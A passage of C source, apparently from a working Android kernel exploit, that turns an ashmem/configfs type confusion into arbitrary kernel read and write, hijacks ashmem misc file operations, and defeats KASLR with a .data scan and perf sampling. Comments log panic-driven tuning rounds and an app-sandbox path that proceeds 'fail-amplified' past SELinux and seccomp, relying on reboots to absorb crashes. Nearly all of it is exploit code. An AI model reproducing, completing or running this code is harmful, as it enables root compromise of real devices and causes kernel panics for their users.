     * the victim -- but >1 hit means contamination (a watermark-tail
     * candidate got walked) and must abort instead of guessing. */
    int tp_nhit2 = 0;
    for (int i = 0; i < tpw2.n; i++) {
      if (tpw2.cand_hits3[i] > 0) tp_nhit2++;
    }
    /* fix54: the capture must land on the SAME candidate the free oracle
     * pinned (k_true).  The free->alloc sequence of one pfn is the
     * victim's lifecycle: fix40 armed the mm_page_free counters across
     * the discard window and saw exactly one candidate pfn free, then
     * the phase-2 send thread ordered that same pfn (task-scoped pid=0
     * counter, so it is our frag alloc and the payload is on that page).
     * A phase-2 hit at any OTHER k is an unrelated order-3 page whose
     * true VA we cannot name (Tier-0's la0 is a guess off by
     * (k_true)*1GiB this boot), and routing through it jumps misc_open
     * into garbage.
     * fix55 (t15153, kernel_panic reboot): the k_true<0 fallback ("free
     * oracle saw nothing, the single-hit rule stands alone") was the
     * round that routed through a coincidence hit into a linear-map hole
     * (cfgfs target ffffffb51d831051 -> deref -> panic).  Every safe
     * round -- the 771b7409 root=1 run and all clean root=0 exits --
     * had k_true>=0 with k_hit==k_true; the sole panic round had
     * k_true=-1 + hit_idx=2/k_hit=0.  Require the oracle: k_true<0 now
     * fails the gate and the capture retries safely (gate retries are
     * cheap; the panic rounds cost a reboot). */
    int k_hit = -1;
    if (phase2_hit_idx >= 0 && phase2_hit_idx < tpw2.n && tpw2.est_pfn)
      k_hit = (int)(((long)tpw2.cand_pfn[phase2_hit_idx] -
                     (long)tpw2.est_pfn) /
                    (1L << 18));
    int hit_evidence = (phase2_hit_idx >= 0) && (tp_nhit2 == 1) &&
                       (k_true >= 0 && k_hit == k_true);
    int vol_ok = (phase2_total_ok >= DRAIN_FLOOR) ||
                 (deterministic && hit_evidence);
    int drain_capture = (phase2_short_sends == 0 && vol_ok && hit_evidence);
    int pass;
    if (fv >= 0)
      pass = content_ok;
    else if (wp_armed)
      pass = wp_capture;
    else if (!ks_tracefs() && tpw2.n == 0 && base && drain_held_pages > 0) {
      /*
       * app-domain (untrusted_app + zygote seccomp) reality: every content
       * oracle is structurally unavailable, not merely failing --
       *   1. tracefs kprobe fetch denied (SELinux: no tracefs write);
       *   2. the configfs read primitive is inert BEFORE the route (its
       *      pread only walks configfs_read_file once misc.fops has been
       *      hijacked -- pre-route a fresh ashmem fd's ->read is the real
       *      ashmem_read, which returns 0 on an unmapped area: the
       *      observed "configfs verify failed r1=0 r2=0");
       *   3. HW watchpoints return EINVAL on this kernel;
       *   4. the fix42 tp capture windows are dead (seccomp denies
       *      perf_event_open, so tpw*.n == 0 and hit_evidence is stuck 0).
       * What DOES hold: the mm_struct leak succeeded (base is a real
       * direct-map address from the KernelSnitch scan), the victim page is
       * pinned at base, and the order-3 hold-drain completed.  Proceed
       * fail-amplified on that behavioral evidence alone: a missed payload
       * panics the route and the reboot loop absorbs it -- the same
       * contract as the shell-domain catch-all (run24/25) and the D2
       * design's documented fallback.  Shell domain never enters here:
       * Tier-0 kprobe (sudo) gives fv >= 0 and Tier-1 tp windows have
       * n > 0. */
      pr_warning("payload gate: no oracle available (app domain); passing "
                 "on behavioral evidence base=%p drain=%d\n",
                 (void *)base, drain_held_pages);
      pass = 1;
    } else
      pass = drain_capture;
    pr_info("payload gate pass=%d content=%d (fv=%d) wp_armed=%d "
            "wp_capture=%d (n=%lld o=%lld s=%lld) drain=%d (sends=%d "
            "shorts=%d floor=%d hit=%d nhit2=%d) hit_idx=%d k_hit=%d "
            "k_true=%d ord3=%lld/%lld all=%lld/%lld drain_pages=%d\n",
            pass, content_ok, fv, wp_armed, wp_capture, wp_n, wp_o, wp_s,
            drain_capture, phase2_total_ok, phase2_short_sends, DRAIN_FLOOR,
            hit_evidence, tp_nhit2, phase2_hit_idx, k_hit, k_true, tp_b1,
            tp_b2, tp_a1, tp_a2, drain_held_pages);
    /* The phase-2 capture (victim pinned by its sockets) is decided; the
     * drain pages can go back to the buddy before the route stage. */
    order3_drain_release();
    if (!pass) {
      pr_warning("payload did not land, discard base=%p freed=%d open_ok=%d "
                 "nonce_hit=%d wp=%d/%d/%d\n",
                 (void *)base, base_freed, fv >= 0 && open_slot == open_want,
                 nonce_hit, (int)wp_n, (int)wp_o, (int)wp_s);
      static int scan_done;
      if (env_on("KS_PAYLOAD_SCAN") && !scan_done) {
        scan_done = 1;
        for (int fi = 0; fi < nfreed && fi < 48; fi++) {
          uintptr_t pg = freed_pages[fi];
          for (int b = 0; b < 4; b++) {
            uintptr_t addrs[64];
            uint64_t vals[64];
            uintptr_t a0 = pg + (uintptr_t)b * 64 * 0x80;
            for (int i = 0; i < 64; i++)
              addrs[i] = a0 + (uintptr_t)i * 0x80;
            int r = ks_probe_fetch_batch(addrs, 64, vals);
            if (r < 0)
              break;
            for (int i = 0; i < 64; i++) {
              if (vals[i] == open_want) {
                long long delta_sugg =
                    (long long)(addrs[i] - FOPS_OPEN_OFF - FOPS_OFF) -
                    (long long)base;
                pr_info("scan hit open@%llx page=%llx delta_sugg=%lld\n",
                        (unsigned long long)addrs[i],
                        (unsigned long long)pg, delta_sugg);
              }
            }
          }
        }
      }
      cleanup_page_prepare_state();
      return 0;
    }
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

static int env_on(const char *name) {
  const char *v = getenv(name);
  if (!v || !v[0]) return 0;
  return strcmp(v, "0") != 0 && strcasecmp(v, "false") != 0 &&
         strcasecmp(v, "no") != 0;
}

/*
 * The ashmem name overlay is shared by every dup of one struct file: the
 * guard thread (main process), the stage code and the forked pipe_prepare
 * child all run try_set_ashmem_name_blob + transfer sequences on dups of the
 * cfi fd.  Two concurrent sequences interleave their descending NUL replants,
 * so a pread can observe the 0x01 initial-pass mutex (owner as
 * 0x0101010101010100) and panic inside configfs_read_file()'s mutex_lock.
 * flock on a fresh open file description serialises the set+transfer pair
 * across threads and processes; each acquisition must open its own fd
 * because flock locks are owned per open file description.
 */
int cfgfs_lock(void) {
  static const char *const paths[] = {
      "/data/local/temp/.cfgfslock",
      "/data/local/tmp/.cfgfslock",
  };
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    int lfd = open(paths[i], O_CREAT | O_RDWR, 0666);
    if (lfd < 0) {
      continue;
    }
    if (flock(lfd, LOCK_EX) == 0) {
      return lfd;
    }
    close(lfd);
  }
  return -1;
}

void cfgfs_unlock(int lfd) {
  if (lfd >= 0) {
    flock(lfd, LOCK_UN);
    close(lfd);
  }
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  int lfd = cfgfs_lock();
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    cfgfs_unlock(lfd);
    if (env_on("KS_CFGFS_LOG")) {
      pr_info("cfgfs write set-fail fd=%d target=%016zx ret=%d errno=%d\n",
              fd, target, set_ret, set_errno);
    }
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  int wr_errno = errno;
  cfgfs_unlock(lfd);
  if (env_on("KS_CFGFS_LOG")) {
    pr_info("cfgfs write fd=%d target=%016zx len=%zu set=%d wr=%zd errno=%d\n",
            fd, target, len, set_ret, wr, wr_errno);
  }
  errno = wr_errno;
  return wr;
}

#ifndef ASHMEM_GET_NAME
#define ASHMEM_GET_NAME _IOWR(__ASHMEMIOC, 2, char[ASHMEM_NAME_LEN])
#endif

static ssize_t cfgfs_read_ex(int fd, uintptr_t target, void *data, size_t len,
                             uint32_t needs_read_fill, int quiet) {
  /* NO alignment check here (fix55 regression, round1/round2 2026-10-22):
   * the +1 payload page-view shift is deliberate -- fix52's dump reads
   * base+OFF+1 by design (fops.c:1624-1634), so a 7-bit mask at this entry
   * rejects every legitimate shifted read: both chains died with
   * "fix52 cfi table garbage ... refusing further ops" (rv=-1 where the
   * 771b7409 baseline had rv=8).  Garbage targets (owner-forensics rounds
   * 7/10, t15153's hole addr) are caught upstream by the gate requiring
   * k_true>=0, not by alignment -- this entry stays permissive. */
  unsigned char blob[128];
  /*
   * layout of the configfs_buffer overlaid on ashmem_area (see
   * build_ashmem_name): count is supplied by the kernel prefix, page lives at
   * name[0x10] = blob[5], mutex at name[0x20] = blob[0x15] and
   * needs_read_fill at name[0x48] = blob[0x3d].
   *
   * Zero the whole blob and let try_set_ashmem_name_blob() materialise the
   * NULs: page is the only field we set, everything else -- including the
   * entire mutex and needs_read_fill -- must read back as 0 or
   * configfs_read_file() either deadlocks on a garbage owner or walks
   * item_ops->show on a NULL pointer.  hi covers through name[0x4c], which is
   * also where the kernel's terminating NUL lands (bool at 0x4c = 0).
   */
  const size_t base = ASHMEM_NAME_PREFIX_LEN;
  size_t hi = CFG_NEEDS_READ_FILL_OFF + 4 - base;
  if (hi > sizeof(blob)) hi = sizeof(blob);
  memset(blob, 0, hi);

  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - base, page);

  int lfd = cfgfs_lock();
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, hi);
  int set_errno = errno;
  if (set_ret != 0) {
    cfgfs_unlock(lfd);
    if (!quiet && env_on("KS_CFGFS_LOG")) {
      pr_info("cfgfs read set-fail fd=%d target=%016zx ret=%d errno=%d\n",
              fd, target, set_ret, set_errno);
    }
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  int rd_errno = errno;
  cfgfs_unlock(lfd);
  if (!quiet && env_on("KS_CFGFS_LOG")) {
    pr_info("cfgfs read fd=%d target=%016zx len=%zu fill=%u pos=%lld "
            "page=%016llx hi=%zu set=%d rd=%zd errno=%d\n",
            fd, target, len, needs_read_fill, (long long)pos,
            (unsigned long long)page, hi, set_ret, rd, rd_errno);
  }
  errno = rd_errno;
  return rd;
}

ssize_t configfs_read_once_quiet(int fd, uintptr_t target, void *data,
                                 size_t len) {
  return cfgfs_read_ex(fd, target, data, len, 0, 1);
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  return cfgfs_read_ex(fd, target, data, len, 0, 0);
}

/*
 * Tier-0 pvo oracle.  kprobe layout measurement needs tracefs writes that
 * SELinux denies to shell on a stock Enforcing boot, so derive the per-boot
 * physvirt_offset (pvo) / page_offset_base (la0 = -pvo) / vmemmap_base
 * triple from the KASLR memory-layout globals in kernel .data instead:
 * scan the image mapping (always mapped -- the scan itself cannot fault)
 * through the configfs read primitive for the distinctive pair
 * {physvirt_offset, -physvirt_offset} (both 1GiB-aligned, pvo in
 * [0x20_00000000, 0xC0_00000000]), take vmemmap_base as the highest
 * 1GiB-aligned 0xffff... cluster-mate of la0 (the mm/kaslr.c trio sits
 * within a few hundred bytes), then verify by reading ashmem_misc_fops
 * through the candidate direct-map alias and comparing against the image
 * mapping.  Emits one parseable line:
 *   pvo-oracle pvo=<hex> la0=<hex> vmem=<hex> verify=OK|FAIL
 */
#ifndef ASHMEM_SET_SIZE
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)
#endif

void run_pvo_oracle(void) {
  int dfd = open_ashmem_device();
  if (dfd < 0) {
    pr_error("pvo-oracle ashmem open failed errno=%d\n", errno);
    return;
  }
  /* Some builds gate the confused read on a sized region; try SET_SIZE
   * first (harmless no-op if the handler ignores it). */
  {
    size_t big = 0x1000;
    int sr = ioctl(dfd, ASHMEM_SET_SIZE, &big);
    pr_info("pvo-oracle SET_SIZE 0x1000 ret=%d errno=%d\n", sr, errno);
  }
  uint64_t ref_open = 0, ref_ioctl = 0;
  ssize_t r1 = configfs_read_once(
      dfd, text_addr(ASHMEM_MISC_FOPS) + FOPS_OPEN_OFF, &ref_open, 8);
  ssize_t r2 = configfs_read_once(
      dfd, text_addr(ASHMEM_MISC_FOPS) + FOPS_IOCTL_OFF, &ref_ioctl, 8);
  pr_info("pvo-oracle refs open=%016llx(%zd) ioctl=%016llx(%zd)\n",
          (unsigned long long)ref_open, r1, (unsigned long long)ref_ioctl, r2);
  if (r1 != 8 || r2 != 8 || ref_open == 0) {
    pr_error("pvo-oracle configfs read broken; abort\n");
    close(dfd);
    return;
  }

  /* .data..bss of the kernel image (EMPTY_ZERO_PAGE_OFF marks the tail). */
  const uintptr_t scan_lo = kaslr_base + 0x1000000ULL;
  const uintptr_t scan_hi = kaslr_base + 0x2e18000ULL;
  enum { MAX_HITS = 64 };
  static struct {
    uintptr_t va;
    uint64_t val;
  } hits[MAX_HITS];
  size_t nhits = 0;
  size_t reads = 0;
  for (uintptr_t va = scan_lo; va < scan_hi; va += 8) {
    uint64_t w = 0;
    if (configfs_read_once_quiet(dfd, va, &w, 8) != 8)
      continue;
    reads++;
    if ((reads & 0x7ffff) == 0)
      pr_info("pvo-oracle scan +%#zx hits=%zu\n", (size_t)(va - scan_lo),
              nhits);
    int interesting = 0;
    /* physvirt_offset: small positive, 1GiB-aligned KASLR delta */
    if (w >= 0x2000000000ULL && w <= 0xc000000000ULL &&
        (w & 0x3fffffffULL) == 0)
      interesting = 1;
    /* linear-map base form: canonical kernel pointer, 1GiB-aligned */
    if (!interesting && (w >> 48) == 0xffff && (w >> 40) != 0xffffff00 &&
        (w & 0x3fffffffULL) == 0 && (w & 0xffff00000000ULL) != 0)
      interesting = 1;
    if (interesting && nhits < MAX_HITS) {
      hits[nhits].va = va;
      hits[nhits].val = w;
      nhits++;
    }
  }
  pr_info("pvo-oracle scan done reads=%zu hits=%zu\n", reads, nhits);
  for (size_t i = 0; i < nhits; i++)
    pr_info("pvo-oracle hit [%zu] va=%016zx val=%016llx\n", i, hits[i].va,
            (unsigned long long)hits[i].val);

  uint64_t best_pvo = 0, best_la0 = 0, best_vmem = 0;
  for (size_t i = 0; i < nhits && !best_pvo; i++) {
    uint64_t pvo = hits[i].val;
    if (pvo < 0x2000000000ULL || pvo > 0xc000000000ULL)
      continue;
    uint64_t la0 = -pvo;
    for (size_t j = 0; j < nhits; j++) {
      if (hits[j].val != la0)
        continue;
      best_pvo = pvo;
      best_la0 = la0;
      for (size_t k = 0; k < nhits; k++) {
        if (k == i || k == j)
          continue;
        uint64_t v = hits[k].val;
        if ((v >> 48) != 0xffff || v == la0 || v < la0)
          continue;
        if ((v & 0x3fffffffULL) != 0)
          continue;
        uintptr_t d = hits[k].va > hits[j].va ? hits[k].va - hits[j].va
                                              : hits[j].va - hits[k].va;
        if (d > 0x1000)
          continue;
        if (v > best_vmem)
          best_vmem = v;
      }
      break;
    }
  }

  if (!best_pvo) {
    pr_error("pvo-oracle no pvo/la0 pair found in .data scan\n");
    close(dfd);
    return;
  }

  /* Advisory verify in a child: a wrong la0 makes the dm read fault the
   * process (kernel oops, panic_on_oops=0) -- parent still reports. */
  pid_t vp = fork();
  if (vp == 0) {
    uintptr_t dm = best_la0 + P0_KERNEL_PHYS_LOAD + ASHMEM_MISC_FOPS_OFF;
    uint64_t vo = 0, vi = 0;
    ssize_t a =
        configfs_read_once_quiet(dfd, dm + FOPS_OPEN_OFF, &vo, 8);
    ssize_t b =
        configfs_read_once_quiet(dfd, dm + FOPS_IOCTL_OFF, &vi, 8);
    _exit((a == 8 && b == 8 && vo == ref_open && vi == ref_ioctl) ? 0 : 1);
  }
  int vst = 0;
  waitpid(vp, &vst, 0);
  const char *vres = WIFEXITED(vst) ? (WEXITSTATUS(vst) == 0 ? "OK" : "MISMATCH")
                                    : "FAULT";
  uint64_t zflags = 0;
  ssize_t zr = -1;
  if (best_vmem) {
    pid_t zp = fork();
    if (zp == 0) {
      uintptr_t zpfn =
          (P0_KERNEL_PHYS_LOAD + EMPTY_ZERO_PAGE_OFF) >> PAGE_SHIFT;
      zr = configfs_read_once_quiet(dfd, best_vmem + zpfn * STRUCT_PAGE_SIZE,
                                    &zflags, 8);
      _exit(zr == 8 ? 0 : 1);
    }
    int zst = 0;
    waitpid(zp, &zst, 0);
    if (!WIFEXITED(zst) || WEXITSTATUS(zst) != 0)
      zr = -1;
  }
  pr_success("pvo-oracle pvo=%016llx la0=%016llx vmem=%016llx verify=%s "
             "zflags=%016llx(%zd)\n",
             (unsigned long long)best_pvo, (unsigned long long)best_la0,
             (unsigned long long)best_vmem, vres, (unsigned long long)zflags,
             zr);
  close(dfd);
}

#ifndef ASHMEM_SET_SIZE
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)
#endif

static void cfgfs_try_read(int fd, const char *tag, uintptr_t target) {
  unsigned char buf[8];
  memset(buf, 0, sizeof(buf));
  ssize_t r0 = cfgfs_read_ex(fd, target, buf, sizeof(buf), 0, 0);
  uint64_t v0 = 0;
  memcpy(&v0, buf, sizeof(v0));
  memset(buf, 0, sizeof(buf));
  ssize_t r1 = cfgfs_read_ex(fd, target, buf, sizeof(buf), 1, 0);
  uint64_t v1 = 0;
  memcpy(&v1, buf, sizeof(v1));
  pr_info("cfgfs probe %s target=%016zx fill0=%zd/%016llx fill1=%zd/%016llx\n",
          tag, target, r0, (unsigned long long)v0, r1,
          (unsigned long long)v1);
}

/*
 * Isolated check of the ashmem/configfs read-write primitive.  Reads that
 * come back 0 mean pread hit EOF (the ashmem region size or the bin file
 * size is too small), not that the target holds zeros, so the caller can
 * tell "no read primitive" apart from "read succeeded".
 */
static void cfgfs_raw_probe(int fd, const char *tag) {
  int fl = fcntl(fd, F_GETFL, 0);
  int fl_errno = errno;
  unsigned char b[8];
  memset(b, 0, sizeof(b));
  errno = 0;
  ssize_t r0 = pread(fd, b, sizeof(b), 0);
  int e0 = errno;
  errno = 0;
  ssize_t r1 = read(fd, b, sizeof(b));
  int e1 = errno;
  errno = 0;
  off_t sk = lseek(fd, 0, SEEK_CUR);
  int e2 = errno;
  pr_info("cfgfs raw %s fd=%d fcntl=%d/%d pread0=%zd/%d read=%zd/%d "
          "lseek=%lld/%d\n",
          tag, fd, fl, fl_errno, r0, e0, r1, e1, (long long)sk, e2);
}

#ifndef ASHMEM_GET_SIZE
#define ASHMEM_GET_SIZE _IOR(__ASHMEMIOC, 4, size_t)
#endif

/*
 * Dump area->name through ASHMEM_GET_NAME.  The whole design rests on two
 * claims measured from the pfum10 Image: ashmem_open() memcpy's
 * "dev/ashmem/" into name[0..11) (which doubles as configfs_buffer.count =
 * ASHMEM_PREFIX_COUNT) and ashmem_set_name() writes our string at name[11],
 * leaving the prefix intact.  If either is wrong the post-route configfs
 * reads are misaligned by 11 bytes (or count is 0 -> pread EOF), so print
 * the raw name bytes right after open and again after each SET_NAME.
 */
static void cfgfs_dump_name(int fd, const char *tag) {
  unsigned char name[ASHMEM_NAME_LEN];
  memset(name, 0, sizeof(name));
  errno = 0;
  int r = ioctl(fd, ASHMEM_GET_NAME, name);
  int e = errno;
  char hex[220], asc[72];
  size_t hi = 0, ai = 0;
  for (size_t i = 0; i < 64 && hi + 3 < sizeof(hex); i++) {
    hi += (size_t)snprintf(hex + hi, sizeof(hex) - hi, "%02x", name[i]);
  }
  for (size_t i = 0; i < 64 && ai + 2 < sizeof(asc); i++) {
    unsigned char c = name[i];
    asc[ai++] = (c >= 0x20 && c < 0x7f) ? (char)c : '.';
  }
  hex[hi] = 0;
  asc[ai] = 0;
  pr_info("cfgfs name %s GET ret=%d errno=%d hex=%s asc=%s\n", tag, r, e, hex,
          asc);
}

/*
 * ASHMEM_SET_SIZE on a fresh fd, by value (real ashmem semantics: area->size
 * = arg) vs by pointer (what run_pvo_oracle accidentally passes: area->size =
 * &local).  pvo2 logged pread errno=9 (EBADF) while the plain probe logged
 * 0/0, so isolate the SET_SIZE call on its own fd and record getsize + pread
 * + read + lseek before/after.
 */
static void cfgfs_setsize_case(const char *tag, int by_ptr) {
  int fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("setsize %s open errno=%d\n", tag, errno);
    return;
  }
  size_t sz0 = 0;
  errno = 0;
  int g0 = ioctl(fd, ASHMEM_GET_SIZE, &sz0);
  int g0e = errno;
  size_t arg = 0x1000;
  errno = 0;
  int sr = by_ptr ? ioctl(fd, ASHMEM_SET_SIZE, &arg)
                  : ioctl(fd, ASHMEM_SET_SIZE, (unsigned long)arg);
  int se = errno;
  size_t sz1 = 0;
  errno = 0;
  int g1 = ioctl(fd, ASHMEM_GET_SIZE, &sz1);
  int g1e = errno;
  unsigned char b[8];
  memset(b, 0, sizeof(b));
  errno = 0;
  ssize_t r0 = pread(fd, b, sizeof(b), 0);
  int e0 = errno;
  memset(b, 0, sizeof(b));
  errno = 0;
  ssize_t rp = pread(fd, b, sizeof(b), (off_t)(ASHMEM_PREFIX_COUNT - 8));
  int ep = errno;
  memset(b, 0, sizeof(b));
  errno = 0;
  ssize_t rr = read(fd, b, sizeof(b));
  int er = errno;
  errno = 0;
  off_t sk = lseek(fd, 0, SEEK_CUR);
  int es = errno;
  pr_info("setsize %s set=%d/%d getsz0=%d/%d/%zu getsz1=%d/%d/%zu "
          "pread0=%zd/%d preadP=%zd/%d read=%zd/%d lseek=%lld/%d\n",
          tag, sr, se, g0, g0e, sz0, g1, g1e, sz1, r0, e0, rp, ep, rr, er,
          (long long)sk, es);
  cfgfs_dump_name(fd, tag);
  close(fd);
}

void ks_cfgfs_probe(void) {
  struct stat st;
  memset(&st, 0, sizeof(st));
  int st_ret = stat(ashmem_path, &st);
  pr_info("cfgfs probe path=%s stat=%d mode=%o rdev=%llx\n", ashmem_path,
          st_ret, st.st_mode, (unsigned long long)st.st_rdev);

  int fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    pr_error("cfgfs probe open errno=%d\n", errno);
    return;
  }

  cfgfs_raw_probe(fd, "fresh");
  cfgfs_dump_name(fd, "fresh");
  {
    size_t sz = 0;
    errno = 0;
    int gr = ioctl(fd, ASHMEM_GET_SIZE, &sz);
    pr_info("cfgfs probe fresh getsz ret=%d errno=%d size=%zu\n", gr, errno,
            sz);
  }
  {
    char tn[ASHMEM_NAME_LEN];
    memset(tn, 0, sizeof(tn));
    memcpy(tn, "TEST123", 8);
    errno = 0;
    int sr = ioctl(fd, ASHMEM_SET_NAME, tn);
    pr_info("cfgfs probe SET_NAME TEST123 ret=%d errno=%d\n", sr, errno);
    cfgfs_dump_name(fd, "after TEST123");
  }
  {
    char tn[ASHMEM_NAME_LEN];
    memset(tn, 0x42, ASHMEM_NAME_LEN - 1);
    tn[ASHMEM_NAME_LEN - 1] = 0;
    errno = 0;
    int sr = ioctl(fd, ASHMEM_SET_NAME, tn);
    pr_info("cfgfs probe SET_NAME Bx255 ret=%d errno=%d\n", sr, errno);
    cfgfs_dump_name(fd, "after Bx255");
  }
  cfgfs_raw_probe(fd, "after-names");
  {
    unsigned char b[8];
    memset(b, 0, sizeof(b));
    errno = 0;
    ssize_t r = pread(fd, b, sizeof(b), (off_t)(ASHMEM_PREFIX_COUNT - 8));
    pr_info("cfgfs probe pread PREFIX_COUNT-8 ret=%zd errno=%d\n", r, errno);
  }
  /*
   * Variant B: assume instead that ashmem_set_name() overwrites name[0] and
   * that ashmem_open() never wrote the "dev/ashmem/" prefix (count would then
   * be 0, which is exactly what explains variant A returning EOF).  Supply
   * the prefix ourselves at name[0] and place the configfs fields at their
   * ABSOLUTE CFG_*_OFF offsets.  If the confused read is live pre-route this
   * returns 8 real bytes of kernel _text; if the fd still serves the plain
   * ashmem fops it stays 0 (harmless -- the page pointer is only dereferenced
   * when count > ppos AND the configfs read path runs).
   */
  {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
    memcpy(blob, "dev/ashmem/", 11);
    off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - 8);
    uintptr_t tgt = text_addr(KIMAGE_TEXT_BASE);
    put64(blob, CFG_PAGE_OFF, tgt - (uintptr_t)pos);
    int lfd = cfgfs_lock();
    errno = 0;
    int sr = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
    int se = errno;
    errno = 0;
    unsigned char out[8];
    memset(out, 0, sizeof(out));
    ssize_t r = pread(fd, out, sizeof(out), pos);
    int re = errno;
    cfgfs_unlock(lfd);
    uint64_t v = 0;
    memcpy(&v, out, sizeof(v));
    pr_info("cfgfs probe variantB set=%d/%d pread=%zd/%d val=%016llx\n", sr,
            se, r, re, (unsigned long long)v);
  }
  cfgfs_setsize_case("val", 0);
  cfgfs_setsize_case("ptr", 1);

  cfgfs_try_read(fd, "_text", text_addr(KIMAGE_TEXT_BASE));
  cfgfs_try_read(fd, "bss_pad", text_addr(BSS_LOCK_PAD));
  cfgfs_try_read(fd, "misc_fops_img", text_addr(ASHMEM_MISC_FOPS));
  cfgfs_try_read(fd, "misc_fops_p0", data_addr(ASHMEM_MISC_FOPS));

  if (page_base && binwrite_target) {
    uint64_t before = 0x1122334455667788ULL;
    ssize_t wr = configfs_write_once(fd, binwrite_target, &before,
                                     sizeof(before));
    pr_info("cfgfs probe write scratch=%016zx ret=%zd errno=%d\n",
            binwrite_target, wr, errno);
    uint64_t back = 0;
    ssize_t rd = configfs_read_once(fd, binwrite_target, &back, sizeof(back));
    pr_info("cfgfs probe readback=%016llx ret=%zd errno=%d\n",
            (unsigned long long)back, rd, errno);
  } else {
    pr_info("cfgfs probe write skipped (page_base=%016zx binwrite=%016zx)\n",
            page_base, binwrite_target);
  }

  close(fd);
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

#define PERF_LEAK_ALIGN 0x200000ULL
#define PERF_LEAK_MMAP_PAGES 8
#define PERF_LEAK_ROUNDS 12

/*
 * One enable -> busy loop -> disable -> parse cycle.  Returns the lowest
 * kernel instruction pointer observed, or ~0 when nothing was sampled.
 *
 * The loop fires a syscall every 64 iterations: a plain spin almost never
 * samples the entry path, which is the lowest-addressed code that actually
 * runs, so min_kip lands several MB above _text and the 2MB-slot rounding
 * used to pick the wrong slot.
 */
static uint64_t perf_sample_round(int *samples_out) {
  *samples_out = 0;
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.disabled = 1;
  pe.wakeup_events = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pe.sample_period = 100000;
    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  }
  if (fd < 0) {
    pr_warning("perf text-base perf_event_open errno=%d\n", errno);
    return ~(uint64_t)0;
  }

  size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
  void *mmap_buf =
      mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (mmap_buf == MAP_FAILED) {
    pr_warning("perf text-base mmap errno=%d\n", errno);
    close(fd);
    return ~(uint64_t)0;
  }
  struct perf_event_mmap_page *header = mmap_buf;

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  for (volatile long i = 0; i < 400000; i++) {
    if ((i % 64) == 0) {
      syscall(__NR_sched_yield);
    }
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t data_tail = header->data_tail;
  uint64_t data_head = header->data_head;
  __sync_synchronize();
  uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
  uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;

  /*
   * Only the head of the image is a usable landmark.  Kernel text spans
   * dozens of 2MB slots and samples land all over it (and past it, in
   * modules), so the raw minimum is frequently a slot that is not _text's
   * own -- on this device the winning sample is always _text+0x1cbc while
   * a stray sample 1.3MB in used to win and produce a base hundreds of MB
   * off, which then aimed the write at an unmapped address.  Restrict the
   * competition to [text_off, text_off+0x40000] so only samples inside the
   * first 256KB of a candidate _text can pick the slot.
   */
  const uint64_t text_off = KIMAGE_TEXT_BASE & (PERF_LEAK_ALIGN - 1);
  /*
   * The instruction perf keeps sampling sits at a fixed offset from _text
